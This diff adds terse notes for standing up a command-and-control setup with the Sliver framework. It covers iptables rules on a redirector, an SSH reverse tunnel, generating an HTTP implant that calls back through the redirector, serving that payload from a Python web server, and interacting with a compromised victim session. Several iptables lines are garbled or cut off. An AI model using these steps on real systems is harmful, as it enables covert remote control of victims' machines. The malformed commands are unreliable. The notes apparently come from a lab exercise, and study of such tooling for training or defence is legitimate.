@@ -1,0 +1,47 @@
+ -- Setup the Redirector --
+
+-- iptables --
+
+$ iptables -A INPUT -i ens18 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -s 172.30.1.56 -j ACCEPT
+$ iptables -nvL
+
+$ iptables -P INPUT DROP
+
+$ iptables -A INPUT -i ens18 -p tcp --dport 80 -m tcp -j ACCEPT
+$ iptables -A INPUT -i ens18 -p tcp --dport 443 -m tcp -j ACCEPT
+$ iptables -nvL
+
+$ iptables -A IMPUT -i ens18 -p zcp --dsport 80
+$ iptables -A INPUT -i ens18 
+
+$ iptables -nvL
+
+
+-- Set Up the Tunnel --
+
+$ ssh -R 0.0.0.0:80:127.0.0.1:80 root@172.100.1.10
+$ netstat -pantu
+
+
+-- Sliver (C2) --
+
+# ./sliver-server_linux
+# [server] sliver > http
+# [server] sliver > httpd
+# [server] sliver > multiplayer
+# [server] sliver > generate --http 172.100.1.10 (redirectors ip)
+
+# python3 -m http.server 8080
+
+# [server] sliver > sessions 
+# [server] sliver > sessions -i fd2ac587 (ID)
+# [server] sliver (FAST_ELM) > ps
+# [server] sliver (FAST_ELM) > background
+# [server] sliver > 
+
+
+-- Victim Machine --
+
+Test the payload
+
+http:// 172.30.1.56:8080
